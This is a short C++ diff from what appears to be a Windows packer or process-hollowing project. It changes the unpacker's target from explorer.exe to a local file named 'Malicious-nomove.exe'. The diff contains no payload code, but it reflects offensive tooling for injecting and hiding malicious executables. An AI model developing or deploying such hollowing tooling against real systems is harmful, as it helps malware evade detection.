@@ -3,9 +3,9 @@
 
 #include "stdafx.h"
 #include <Windows.h>
-#include "RISCYPacker.h"
 #include "Unpacker.h"
 #include "Hollower.h"
+#include "resource.h"
 #include <string>
 
 #define MAX_LOADSTRING 100
@@ -32,10 +32,10 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
     // TODO: Place code here.
 	
 	Unpacker upack;
-	upack.UnpackIntoProcess(L"C:\\Windows\\explorer.exe");
-
+	WCHAR fileName[MAX_PATH] = L"C:\\Users\\capta\\Documents\\Visual Studio 2017\\Projects\\MinimalExe\\Release\\Malicious-nomove.exe";
+	//GetModuleFileName(NULL, fileName, MAX_PATH);
+	upack.UnpackIntoProcess(fileName);
 }
-
 
 
 //
